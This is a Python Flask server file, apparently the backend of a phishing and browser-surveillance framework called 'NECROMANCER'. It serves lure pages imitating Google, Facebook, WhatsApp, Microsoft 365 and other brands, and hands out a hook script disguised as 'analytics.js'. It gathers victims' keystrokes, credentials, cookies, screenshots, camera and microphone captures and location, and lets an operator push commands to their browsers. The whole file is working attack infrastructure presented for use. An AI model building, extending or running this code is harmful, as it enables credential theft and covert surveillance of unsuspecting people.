#!/usr/bin/env python3
"""
NECROMANCER PROJECT
AUTHOR : 0xTOM7
GITHUB : tom7voldemort
VERSION : 1.0.0
"""

import os
import sys
import json
import uuid
import time
import hashlib
import logging
import threading
import base64
from datetime import datetime, timedelta
from functools import wraps
from pathlib import Path

# ---- FIX #1: Force UTF-8 on Windows console ----
if sys.platform == "win32":
    import io

    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")
    os.environ.setdefault("PYTHONIOENCODING", "utf-8")

from flask import (
    Flask,
    render_template,
    request,
    jsonify,
    Response,
    redirect,
    url_for,
    session,
    send_file,
    abort,
    make_response,
)
from flask_socketio import SocketIO, join_room
from cryptography.fernet import Fernet
from user_agents import parse as ua_parse


# CONFIGURATION


class Config:
    BASE_DIR = Path(__file__).parent.resolve()
    DATA_DIR = BASE_DIR / "data"
    PAYLOADS_DIR = BASE_DIR / "payloads"
    TEMPLATES_DIR = BASE_DIR / "templates"
    STATIC_DIR = BASE_DIR / "static"
    SCREENSHOTS_DIR = DATA_DIR / "screenshots"
    KEYLOGS_DIR = DATA_DIR / "keylogs"
    RECORDINGS_DIR = DATA_DIR / "recordings"
    CAPTURES_DIR = DATA_DIR / "captures"
    CERTS_DIR = BASE_DIR / "certs"

    HOST = "0.0.0.0"
    PORT = int(os.environ.get("PORT", 8443))
    DEBUG = os.environ.get("DEBUG", "false").lower() == "true"
    SECRET_KEY = os.environ.get("SECRET_KEY", Fernet.generate_key().decode())

    # SSL - Required for geolocation/camera/mic on browsers
    SSL_ENABLED = os.environ.get("SSL_ENABLED", "true").lower() == "true"
    SSL_CERT = os.environ.get("SSL_CERT", "")
    SSL_KEY = os.environ.get("SSL_KEY", "")

    ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
    ADMIN_PASS_HASH = hashlib.sha256(
        os.environ.get("ADMIN_PASS", "TOMCAT26X").encode()
    ).hexdigest()

    SESSION_TIMEOUT = 60

    LANDING_TEMPLATES = {
        "google_login": {"name": "Google Security Alert", "icon": "fab fa-google"},
        "facebook_verify": {"name": "Facebook Verification", "icon": "fab fa-facebook"},
        "instagram_badge": {"name": "Instagram Badge", "icon": "fab fa-instagram"},
        "whatsapp_update": {"name": "WhatsApp Update", "icon": "fab fa-whatsapp"},
        "netflix_payment": {"name": "Netflix Payment", "icon": "fas fa-film"},
        "linkedin_connect": {"name": "LinkedIn Request", "icon": "fab fa-linkedin"},
        "microsoft_365": {"name": "Microsoft 365 Alert", "icon": "fab fa-microsoft"},
        "custom": {"name": "Custom Template", "icon": "fas fa-pencil-alt"},
        "blank": {"name": "Minimal / Redirect", "icon": "fas fa-file"},
    }


# Create directories
for d in [
    Config.DATA_DIR,
    Config.PAYLOADS_DIR,
    Config.SCREENSHOTS_DIR,
    Config.KEYLOGS_DIR,
    Config.RECORDINGS_DIR,
    Config.CAPTURES_DIR,
    Config.STATIC_DIR / "css",
    Config.STATIC_DIR / "js",
    Config.CERTS_DIR,
]:
    d.mkdir(parents=True, exist_ok=True)


# LOGGING (Fixed for Windows - no emoji in log messages)


class SafeStreamHandler(logging.StreamHandler):
    """Handler that won't crash on emoji/unicode on Windows"""

    def emit(self, record):
        try:
            msg = self.format(record)
            stream = self.stream
            try:
                stream.write(msg + self.terminator)
            except UnicodeEncodeError:
                # Fallback: encode with replace
                stream.write(
                    msg.encode("utf-8", errors="replace").decode(
                        "ascii", errors="replace"
                    )
                    + self.terminator
                )
            self.flush()
        except Exception:
            self.handleError(record)


logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s | %(name)s | %(message)s",
    handlers=[
        logging.FileHandler(Config.DATA_DIR / "server.log", encoding="utf-8"),
        SafeStreamHandler(sys.stdout),
    ],
)
logger = logging.getLogger("ReconFramework")


# SSL CERTIFICATE GENERATOR (Self-signed for local testing)


def generate_self_signed_cert():
    """Generate self-signed cert for HTTPS (needed for geolocation/camera/mic)"""
    cert_file = Config.CERTS_DIR / "cert.pem"
    key_file = Config.CERTS_DIR / "key.pem"

    if cert_file.exists() and key_file.exists():
        return str(cert_file), str(key_file)

    logger.info("[SSL] Generating self-signed certificate...")

    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import ipaddress

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

        name = x509.Name(
            [
                x509.NameAttribute(NameOID.COMMON_NAME, "ReconFramework"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Security Research"),
            ]
        )

        san = x509.SubjectAlternativeName(
            [
                x509.DNSName("localhost"),
                x509.DNSName("*.localhost"),
                x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
                x509.IPAddress(ipaddress.IPv4Address("0.0.0.0")),
            ]
        )

        # Try to add local IP
        try:
            import socket

            local_ip = socket.gethostbyname(socket.gethostname())
            san_list = list(san._general_names._general_names)
            san_list.append(x509.IPAddress(ipaddress.IPv4Address(local_ip)))
            san = x509.SubjectAlternativeName(san_list)
        except Exception:
            pass

        cert = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.utcnow())
            .not_valid_after(datetime.utcnow() + timedelta(days=365))
            .add_extension(san, critical=False)
            .add_extension(
                x509.BasicConstraints(ca=True, path_length=None), critical=True
            )
            .sign(key, hashes.SHA256())
        )

        with open(cert_file, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))

        with open(key_file, "wb") as f:
            f.write(
                key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.TraditionalOpenSSL,
                    serialization.NoEncryption(),
                )
            )

        logger.info("[SSL] Certificate generated: %s", str(cert_file))
        return str(cert_file), str(key_file)

    except ImportError:
        logger.warning(
            "[SSL] cryptography package needed for cert generation. Using openssl fallback..."
        )

        import subprocess

        try:
            subprocess.run(
                [
                    "openssl",
                    "req",
                    "-x509",
                    "-newkey",
                    "rsa:2048",
                    "-keyout",
                    str(key_file),
                    "-out",
                    str(cert_file),
                    "-days",
                    "365",
                    "-nodes",
                    "-subj",
                    "/CN=ReconFramework/O=SecurityResearch",
                ],
                check=True,
                capture_output=True,
            )
            return str(cert_file), str(key_file)
        except Exception as e:
            logger.error("[SSL] Failed to generate cert: %s", e)
            return None, None

    except Exception as e:
        logger.error("[SSL] Cert generation error: %s", e)
        return None, None


# SESSION STORE (Fixed file save race condition for Windows)


class SessionStore:
    """Thread-safe session data management with Windows-safe file ops"""

    FIELDS = [
        "fingerprint",
        "geolocation",
        "network_info",
        "browser_data",
        "hardware_info",
        "permissions",
        "keylog",
        "clipboard",
        "screenshots",
        "camera_captures",
        "audio_recordings",
        "form_data",
        "credentials",
        "cookies_observed",
        "local_storage",
        "session_storage",
        "page_visits",
        "click_map",
        "scroll_data",
        "mouse_movements",
        "touch_events",
        "social_media_detected",
        "installed_apps_hints",
        "battery_info",
        "device_motion",
        "device_orientation",
        "webrtc_leaks",
        "canvas_fingerprint",
        "webgl_fingerprint",
        "audio_fingerprint",
        "font_list",
        "plugin_list",
        "screen_info",
        "timezone_info",
        "language_info",
        "connection_info",
        "referrer_info",
        "dom_content",
        "ajax_intercepts",
        "custom_events",
        "notification_status",
        "visibility_log",
    ]

    def __init__(self):
        self._lock = threading.RLock()
        self._sessions = {}
        self._file = Config.DATA_DIR / "sessions.json"
        self._save_timer = None
        self._dirty = False
        self._load()

    def _load(self):
        try:
            if self._file.exists() and self._file.stat().st_size > 0:
                with open(self._file, "r", encoding="utf-8") as f:
                    self._sessions = json.load(f)
                logger.info(
                    "[STORE] Loaded %d sessions from disk.", len(self._sessions)
                )
        except Exception as e:
            logger.error("[STORE] Load error: %s", e)
            self._sessions = {}

    def _save(self):
        """Debounced save - prevents race condition on Windows"""
        self._dirty = True
        if self._save_timer is None or not self._save_timer.is_alive():
            self._save_timer = threading.Timer(1.0, self._do_save)
            self._save_timer.daemon = True
            self._save_timer.start()

    def _do_save(self):
        """Actual save operation"""
        if not self._dirty:
            return
        with self._lock:
            try:
                # Write directly (no atomic rename - Windows has issues)
                with open(self._file, "w", encoding="utf-8") as f:
                    json.dump(
                        self._sessions, f, indent=2, default=str, ensure_ascii=False
                    )
                self._dirty = False
            except Exception as e:
                logger.error("[STORE] Save error: %s", e)

    def _template(self):
        s = {}
        for field in self.FIELDS:
            if field in (
                "fingerprint",
                "network_info",
                "browser_data",
                "hardware_info",
                "permissions",
                "battery_info",
                "webrtc_leaks",
                "local_storage",
                "session_storage",
                "screen_info",
                "timezone_info",
                "language_info",
                "connection_info",
                "referrer_info",
                "notification_status",
            ):
                s[field] = {}
            elif field in (
                "canvas_fingerprint",
                "webgl_fingerprint",
                "audio_fingerprint",
            ):
                s[field] = ""
            else:
                s[field] = []
        return s

    def create(self, sid, initial):
        with self._lock:
            s = self._template()
            s.update(
                {
                    "id": sid,
                    "created_at": datetime.now().isoformat(),
                    "last_seen": datetime.now().isoformat(),
                    "status": "active",
                    "ip_address": initial.get("ip", "unknown"),
                    "user_agent_raw": initial.get("user_agent", ""),
                    "user_agent_parsed": initial.get("ua_parsed", {}),
                    "ip_geolocation": {},
                    "link_id": initial.get("link_id", ""),
                    "template": initial.get("template", ""),
                    "notes": "",
                    "tags": [],
                }
            )
            self._sessions[sid] = s
            self._save()
            return s

    def update(self, sid, data, merge_key=None):
        with self._lock:
            if sid not in self._sessions:
                return None
            self._sessions[sid]["last_seen"] = datetime.now().isoformat()

            if merge_key:
                existing = self._sessions[sid].get(merge_key)
                if isinstance(existing, list):
                    if isinstance(data, list):
                        existing.extend(data)
                    else:
                        existing.append(data)
                elif isinstance(existing, dict) and isinstance(data, dict):
                    existing.update(data)
                else:
                    self._sessions[sid][merge_key] = data
            else:
                for k, v in data.items():
                    cur = self._sessions[sid].get(k)
                    if isinstance(cur, list) and isinstance(v, list):
                        cur.extend(v)
                    elif isinstance(cur, dict) and isinstance(v, dict):
                        cur.update(v)
                    else:
                        self._sessions[sid][k] = v

            self._save()
            return self._sessions[sid]

    def get(self, sid):
        with self._lock:
            return self._sessions.get(sid)

    def get_all(self):
        with self._lock:
            return dict(self._sessions)

    def delete(self, sid):
        with self._lock:
            if sid in self._sessions:
                del self._sessions[sid]
                self._save()
                return True
            return False

    def active_count(self):
        with self._lock:
            cutoff = (datetime.now() - timedelta(minutes=5)).isoformat()
            return sum(
                1 for s in self._sessions.values() if s.get("last_seen", "") > cutoff
            )

    def search(self, query):
        with self._lock:
            q = query.lower()
            return [d for d in self._sessions.values() if q in json.dumps(d).lower()]


store = SessionStore()


# LINK STORE


class LinkStore:
    def __init__(self):
        self._lock = threading.RLock()
        self._file = Config.DATA_DIR / "links.json"
        self._links = {}
        self._load()

    def _load(self):
        try:
            if self._file.exists() and self._file.stat().st_size > 0:
                with open(self._file, "r", encoding="utf-8") as f:
                    self._links = json.load(f)
        except Exception:
            self._links = {}

    def _save(self):
        with self._lock:
            try:
                with open(self._file, "w", encoding="utf-8") as f:
                    json.dump(self._links, f, indent=2, ensure_ascii=False)
            except Exception as e:
                logger.error("[LINKS] Save error: %s", e)

    def create(self, link_id, data):
        with self._lock:
            self._links[link_id] = data
            self._save()

    def get(self, link_id):
        with self._lock:
            return self._links.get(link_id)

    def increment_visits(self, link_id):
        with self._lock:
            if link_id in self._links:
                self._links[link_id]["visits"] = (
                    self._links[link_id].get("visits", 0) + 1
                )
                self._save()

    def get_all(self):
        with self._lock:
            return dict(self._links)


links_store = LinkStore()


# IP GEOLOCATION


def geolocate_ip(ip):
    if ip in ("127.0.0.1", "::1", "localhost"):
        return {"status": "fail", "message": "localhost"}
    try:
        import requests as req

        resp = req.get("http://ip-api.com/json/%s?fields=66846719" % ip, timeout=5)
        if resp.status_code == 200:
            return resp.json()
    except Exception:
        pass
    return {"query": ip, "status": "fail"}


# FLASK APP


app = Flask(
    __name__,
    template_folder=str(Config.TEMPLATES_DIR),
    static_folder=str(Config.STATIC_DIR),
)
app.config["SECRET_KEY"] = Config.SECRET_KEY
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(minutes=Config.SESSION_TIMEOUT)

socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    ping_timeout=60,
    ping_interval=25,
)


# AUTH


def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("authenticated"):
            if request.is_json or request.path.startswith("/api/"):
                return jsonify({"error": "Unauthorized"}), 401
            return redirect(url_for("login"))
        return f(*args, **kwargs)

    return decorated


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        user = request.form.get("username", "")
        pw = request.form.get("password", "")
        pw_hash = hashlib.sha256(pw.encode()).hexdigest()
        if user == Config.ADMIN_USER and pw_hash == Config.ADMIN_PASS_HASH:
            session["authenticated"] = True
            session.permanent = True
            logger.info("[AUTH] Admin login from %s", request.remote_addr)
            return redirect(url_for("dashboard"))
        logger.warning("[AUTH] Failed login from %s", request.remote_addr)
        return render_template("index.html", page="login", error="Invalid credentials")
    return render_template("index.html", page="login")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


# DASHBOARD PAGES


@app.route("/")
@require_auth
def dashboard():
    all_sessions = store.get_all()
    stats = {
        "total": len(all_sessions),
        "active": store.active_count(),
        "keylogs": sum(len(s.get("keylog", [])) for s in all_sessions.values()),
        "screenshots": sum(
            len(s.get("screenshots", [])) for s in all_sessions.values()
        ),
        "credentials": sum(
            len(s.get("credentials", [])) for s in all_sessions.values()
        ),
        "locations": sum(len(s.get("geolocation", [])) for s in all_sessions.values()),
        "cameras": sum(
            len(s.get("camera_captures", [])) for s in all_sessions.values()
        ),
        "forms": sum(len(s.get("form_data", [])) for s in all_sessions.values()),
    }
    return render_template(
        "index.html", page="dashboard", sessions=all_sessions, stats=stats
    )


@app.route("/session/<sid>")
@require_auth
def session_detail(sid):
    s = store.get(sid)
    if not s:
        abort(404)
    return render_template("index.html", page="session_detail", s=s, sid=sid)


@app.route("/campaigns")
@require_auth
def campaigns():
    all_links = links_store.get_all()
    return render_template(
        "index.html",
        page="campaigns",
        templates=Config.LANDING_TEMPLATES,
        links=all_links,
    )


@app.route("/live")
@require_auth
def live_monitor():
    return render_template("index.html", page="live")


# API - DASHBOARD


@app.route("/api/sessions")
@require_auth
def api_sessions():
    all_s = store.get_all()
    summaries = []
    for sid, data in all_s.items():
        geo = data.get("geolocation", [])
        country = ""
        city = ""
        if geo and isinstance(geo, list) and len(geo) > 0:
            last = geo[-1]
            if isinstance(last, dict):
                country = last.get("country", last.get("countryCode", ""))
                city = last.get("city", "")

        summaries.append(
            {
                "id": sid,
                "ip": data.get("ip_address", "?"),
                "created": data.get("created_at", ""),
                "last_seen": data.get("last_seen", ""),
                "status": data.get("status", "unknown"),
                "browser": data.get("user_agent_parsed", {}).get("browser", "?"),
                "os": data.get("user_agent_parsed", {}).get("os", "?"),
                "device": data.get("user_agent_parsed", {}).get("device", "?"),
                "is_mobile": data.get("user_agent_parsed", {}).get("is_mobile", False),
                "country": country,
                "city": city,
                "keylogs": len(data.get("keylog", [])),
                "screenshots": len(data.get("screenshots", [])),
                "credentials": len(data.get("credentials", [])),
                "cameras": len(data.get("camera_captures", [])),
            }
        )
    return jsonify({"sessions": summaries, "active": store.active_count()})


@app.route("/api/session/<sid>")
@require_auth
def api_session(sid):
    s = store.get(sid)
    if not s:
        return jsonify({"error": "Not found"}), 404
    return jsonify(s)


@app.route("/api/session/<sid>", methods=["DELETE"])
@require_auth
def api_delete_session(sid):
    if store.delete(sid):
        return jsonify({"status": "deleted"})
    return jsonify({"error": "Not found"}), 404


@app.route("/api/session/<sid>/command", methods=["POST"])
@require_auth
def api_command(sid):
    data = request.json or {}
    cmd = data.get("command", "")
    params = data.get("params", {})
    socketio.emit("execute_command", {"command": cmd, "params": params}, room=sid)
    logger.info("[CMD] -> %s: %s", sid[:8], cmd)
    return jsonify({"status": "sent", "command": cmd})


@app.route("/api/session/<sid>/notes", methods=["POST"])
@require_auth
def api_notes(sid):
    data = request.json or {}
    store.update(sid, {"notes": data.get("notes", "")})
    return jsonify({"status": "ok"})


@app.route("/api/session/<sid>/export")
@require_auth
def api_export(sid):
    s = store.get(sid)
    if not s:
        return jsonify({"error": "Not found"}), 404
    return Response(
        json.dumps(s, indent=2, default=str, ensure_ascii=False),
        mimetype="application/json",
        headers={"Content-Disposition": "attachment;filename=session_%s.json" % sid},
    )


@app.route("/api/generate_link", methods=["POST"])
@require_auth
def api_gen_link():
    data = request.json or {}
    template = data.get("template", "blank")
    custom_path = data.get("path", "").strip("/")
    link_id = str(uuid.uuid4())[:8]
    path = "/t/%s" % (custom_path if custom_path else link_id)

    config = {
        "id": link_id,
        "template": template,
        "path": path,
        "created": datetime.now().isoformat(),
        "visits": 0,
    }
    links_store.create(link_id, config)

    scheme = "https" if (request.is_secure or Config.SSL_ENABLED) else "http"
    full_url = "%s://%s%s" % (scheme, request.host, path)

    return jsonify({"link": full_url, "link_id": link_id, "config": config})


@app.route("/api/search")
@require_auth
def api_search():
    q = request.args.get("q", "")
    results = store.search(q)
    return jsonify({"results": results, "count": len(results)})


@app.route("/api/stats")
@require_auth
def api_stats():
    all_s = store.get_all()
    return jsonify(
        {
            "total": len(all_s),
            "active": store.active_count(),
            "keylogs": sum(len(s.get("keylog", [])) for s in all_s.values()),
            "screenshots": sum(len(s.get("screenshots", [])) for s in all_s.values()),
            "credentials": sum(len(s.get("credentials", [])) for s in all_s.values()),
            "locations": sum(len(s.get("geolocation", [])) for s in all_s.values()),
        }
    )


# CAPTURE SERVING


@app.route("/api/capture/<filename>")
@require_auth
def serve_capture(filename):
    for d in [Config.SCREENSHOTS_DIR, Config.CAPTURES_DIR]:
        fp = d / filename
        if fp.exists():
            return send_file(str(fp))
    abort(404)


# LANDING PAGE


@app.route("/t/<link_id>")
def landing(link_id):
    link_config = links_store.get(link_id) or {"template": "blank"}
    links_store.increment_visits(link_id)

    ua_string = request.headers.get("User-Agent", "")
    ua = ua_parse(ua_string)
    ua_parsed = {
        "browser": "%s %s" % (ua.browser.family, ua.browser.version_string),
        "os": "%s %s" % (ua.os.family, ua.os.version_string),
        "device": ua.device.family,
        "is_mobile": ua.is_mobile,
        "is_tablet": ua.is_tablet,
        "is_pc": ua.is_pc,
        "is_bot": ua.is_bot,
    }

    ip = request.headers.get(
        "X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)
    )
    if "," in ip:
        ip = ip.split(",")[0].strip()

    visitor_sid = str(uuid.uuid4())

    store.create(
        visitor_sid,
        {
            "ip": ip,
            "user_agent": ua_string,
            "ua_parsed": ua_parsed,
            "link_id": link_id,
            "template": link_config.get("template", "blank"),
        },
    )

    def bg_geo(sid, addr):
        geo = geolocate_ip(addr)
        if geo.get("status") != "fail":
            store.update(sid, geo, merge_key="geolocation")
            store.update(sid, {"ip_geolocation": geo})

    threading.Thread(target=bg_geo, args=(visitor_sid, ip), daemon=True).start()

    logger.info(
        "[TARGET] sid=%s ip=%s ua=%s/%s",
        visitor_sid[:8],
        ip,
        ua.browser.family,
        ua.os.family,
    )

    socketio.emit(
        "new_session",
        {
            "id": visitor_sid,
            "ip": ip,
            "ua": ua_parsed,
            "time": datetime.now().isoformat(),
        },
    )

    tpl = link_config.get("template", "blank")

    # Determine server URL (with proper scheme)
    scheme = "https" if (request.is_secure or Config.SSL_ENABLED) else "http"
    server_url = "%s://%s" % (scheme, request.host)

    return render_template(
        "index.html",
        page="landing",
        template_type=tpl,
        session_id=visitor_sid,
        server_url=server_url,
    )


# PAYLOAD SERVING


@app.route("/assets/js/analytics.js")
def serve_payload():
    sid = request.args.get("sid", "")
    hook_path = Config.PAYLOADS_DIR / "hook.js"

    if not hook_path.exists():
        return "// payload not found", 404

    with open(hook_path, "r", encoding="utf-8") as f:
        js = f.read()

    scheme = "https" if (request.is_secure or Config.SSL_ENABLED) else "http"
    server_url = "%s://%s" % (scheme, request.host)

    js = js.replace("__SESSION_ID__", sid)
    js = js.replace("__SERVER_URL__", server_url)

    resp = make_response(js)
    resp.headers["Content-Type"] = "application/javascript; charset=utf-8"
    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    return resp


# DATA COLLECTION


TYPE_MAP = {
    "fingerprint": "fingerprint",
    "geo": "geolocation",
    "network": "network_info",
    "browser": "browser_data",
    "hardware": "hardware_info",
    "permissions": "permissions",
    "keylog": "keylog",
    "clipboard": "clipboard",
    "screenshot": "screenshots",
    "camera": "camera_captures",
    "audio": "audio_recordings",
    "form": "form_data",
    "creds": "credentials",
    "cookies": "cookies_observed",
    "localstorage": "local_storage",
    "sessionstorage": "session_storage",
    "pagevisit": "page_visits",
    "click": "click_map",
    "scroll": "scroll_data",
    "mouse": "mouse_movements",
    "touch": "touch_events",
    "social": "social_media_detected",
    "apps": "installed_apps_hints",
    "battery": "battery_info",
    "motion": "device_motion",
    "orientation": "device_orientation",
    "webrtc": "webrtc_leaks",
    "canvas_fp": "canvas_fingerprint",
    "webgl_fp": "webgl_fingerprint",
    "audio_fp": "audio_fingerprint",
    "fonts": "font_list",
    "plugins": "plugin_list",
    "screen": "screen_info",
    "timezone": "timezone_info",
    "language": "language_info",
    "connection": "connection_info",
    "referrer": "referrer_info",
    "dom": "dom_content",
    "ajax": "ajax_intercepts",
    "ws_data": "custom_events",
    "custom": "custom_events",
    "visibility": "visibility_log",
    "notification": "notification_status",
}


@app.route("/api/c/beacon", methods=["POST"])
def collect_beacon():
    try:
        data = request.json or {}
        sid = data.get("sid", "")
        dtype = data.get("type", "")
        payload = data.get("data", {})

        if not sid or not store.get(sid):
            return jsonify({"s": 0}), 200

        merge_key = TYPE_MAP.get(dtype, "custom_events")

        if isinstance(payload, dict):
            payload["_ts"] = datetime.now().isoformat()
        elif isinstance(payload, list):
            for item in payload:
                if isinstance(item, dict):
                    item["_ts"] = datetime.now().isoformat()

        store.update(sid, payload, merge_key=merge_key)

        socketio.emit(
            "data_update",
            {
                "session_id": sid,
                "type": dtype,
                "preview": str(payload)[:300],
                "time": datetime.now().isoformat(),
            },
        )

        return jsonify({"s": 1}), 200
    except Exception as e:
        logger.error("[BEACON] %s", e)
        return jsonify({"s": 0}), 200


@app.route("/api/c/img", methods=["POST"])
def collect_image():
    try:
        data = request.json or {}
        sid = data.get("sid", "")
        img_type = data.get("type", "screenshot")
        img_b64 = data.get("data", "")

        if not sid or not img_b64:
            return jsonify({"s": 0}), 200

        filename = "%s_%s_%d.png" % (sid[:8], img_type, int(time.time()))
        save_dir = (
            Config.SCREENSHOTS_DIR if img_type == "screenshot" else Config.CAPTURES_DIR
        )

        if "base64," in img_b64:
            img_b64 = img_b64.split("base64,")[1]

        filepath = save_dir / filename
        with open(filepath, "wb") as f:
            f.write(base64.b64decode(img_b64))

        merge_key = "screenshots" if img_type == "screenshot" else "camera_captures"
        store.update(
            sid,
            {
                "filename": filename,
                "timestamp": datetime.now().isoformat(),
                "size": os.path.getsize(filepath),
            },
            merge_key=merge_key,
        )

        socketio.emit(
            "image_captured",
            {
                "session_id": sid,
                "type": img_type,
                "filename": filename,
                "time": datetime.now().isoformat(),
            },
        )

        return jsonify({"s": 1}), 200
    except Exception as e:
        logger.error("[IMG] %s", e)
        return jsonify({"s": 0}), 200


@app.route("/api/c/audio", methods=["POST"])
def collect_audio():
    try:
        sid = request.form.get("sid", "")
        audio = request.files.get("audio")
        if not sid or not audio:
            return jsonify({"s": 0}), 200

        filename = "%s_audio_%d.webm" % (sid[:8], int(time.time()))
        filepath = Config.RECORDINGS_DIR / filename
        audio.save(str(filepath))

        store.update(
            sid,
            {
                "filename": filename,
                "timestamp": datetime.now().isoformat(),
                "size": os.path.getsize(filepath),
            },
            merge_key="audio_recordings",
        )

        return jsonify({"s": 1}), 200
    except Exception as e:
        logger.error("[AUDIO] %s", e)
        return jsonify({"s": 0}), 200


# WEBSOCKET


@socketio.on("connect")
def on_connect():
    pass


@socketio.on("disconnect")
def on_disconnect():
    pass


@socketio.on("register_session")
def on_register(data):
    sid = data.get("sid", "")
    if sid and store.get(sid):
        join_room(sid)
        store.update(sid, {"status": "connected", "ws_id": request.sid})
        logger.info("[WS] Session %s... connected", sid[:8])


@socketio.on("session_data")
def on_session_data(data):
    sid = data.get("sid", "")
    dtype = data.get("type", "")
    payload = data.get("data", {})
    if sid and store.get(sid):
        merge_key = TYPE_MAP.get(dtype, "custom_events")
        if isinstance(payload, dict):
            payload["_ts"] = datetime.now().isoformat()
        store.update(sid, payload, merge_key=merge_key)
        socketio.emit(
            "data_update",
            {
                "session_id": sid,
                "type": dtype,
                "preview": str(payload)[:300],
                "time": datetime.now().isoformat(),
            },
        )


@socketio.on("join_monitor")
def on_join_monitor(data):
    sid = data.get("session_id", "")
    join_room("monitor_%s" % sid)


# MAIN


def print_banner():
    from config.tools import banner

    banner()
    scheme = "https" if Config.SSL_ENABLED else "http"
    print("  [*] Dashboard:  %s://127.0.0.1:%d" % (scheme, Config.PORT))
    print("  [*] Username:   %s" % Config.ADMIN_USER)
    print("  [*] Password:   (set via ADMIN_PASS env var)")
    print("  [*] SSL:        %s" % ("Enabled" if Config.SSL_ENABLED else "Disabled"))
    print("  [*] Data dir:   %s" % Config.DATA_DIR)
    print("")

    if Config.SSL_ENABLED:
        print("  [!] IMPORTANT: Browser will show SSL warning for self-signed cert.")
        print("  [!] Click 'Advanced' -> 'Proceed' to accept.")
        print("  [!] HTTPS is REQUIRED for geolocation/camera/microphone APIs.")
        print("")


if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    print_banner()

    ssl_context = None
    if Config.SSL_ENABLED:
        if Config.SSL_CERT and Config.SSL_KEY:
            ssl_context = (Config.SSL_CERT, Config.SSL_KEY)
            logger.info("[SSL] Using provided cert: %s", Config.SSL_CERT)
        else:
            cert, key = generate_self_signed_cert()
            if cert and key:
                ssl_context = (cert, key)
                logger.info("[SSL] Using self-signed cert")
            else:
                logger.warning("[SSL] No cert available, falling back to HTTP")
                logger.warning(
                    "[SSL] Geolocation/Camera/Mic will NOT work without HTTPS!"
                )

    kwargs = {
        "host": Config.HOST,
        "port": Config.PORT,
        "debug": Config.DEBUG,
        "allow_unsafe_werkzeug": True,
    }

    if ssl_context:
        # For socketio.run with SSL
        import ssl as ssl_module

        ctx = ssl_module.SSLContext(ssl_module.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(ssl_context[0], ssl_context[1])
        kwargs["ssl_context"] = ctx

    socketio.run(app, **kwargs)
